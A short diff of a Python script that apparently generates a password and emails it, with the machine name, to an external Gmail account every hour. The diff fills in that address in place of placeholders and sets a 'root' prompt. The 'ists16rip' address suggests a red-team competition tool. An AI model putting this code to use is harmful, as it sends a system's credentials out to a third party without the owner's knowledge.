@@ -15,10 +15,10 @@ def makepass():
 	
 	return passit
 def throwpass(passit):
-	fromaddr = 'sender@mail.com'
-	toaddrs =  'receiver@mail.com'
+	fromaddr = 'ists16rip@gmail.com'
+	toaddrs =  'ists16rip@gmail.com'
 	msg = passit + ' ' + pcname
-	username = 'sender@mail.com'
+	username = 'ists16rip@gmail.com'
 	password = 'password'
 	server = smtplib.SMTP('smtp.mail.com:587')
 	server.starttls()
@@ -28,10 +28,10 @@ def throwpass(passit):
 	return
 
 def testthepass():
-	fromaddr = 'sender@mail.com'
-	toaddrs =  'sender@mail.com'
+	fromaddr = 'ists16rip@gmail.com'
+	toaddrs =  'ists16rip@gmail.com'
 	msg = "test"
-	username = 'sender@mail.com'
+	username = 'ists16rip@gmail.com'
 	password = 'password'
 	server = smtplib.SMTP('smtp.mail.com:587')
 	server.starttls()
@@ -50,7 +50,7 @@ def main():
 	time.sleep(3600)
 	main()
 
-login = raw_input("username")
+login = raw_input("root")
 pcname = raw_input('pcname')
 main()
 
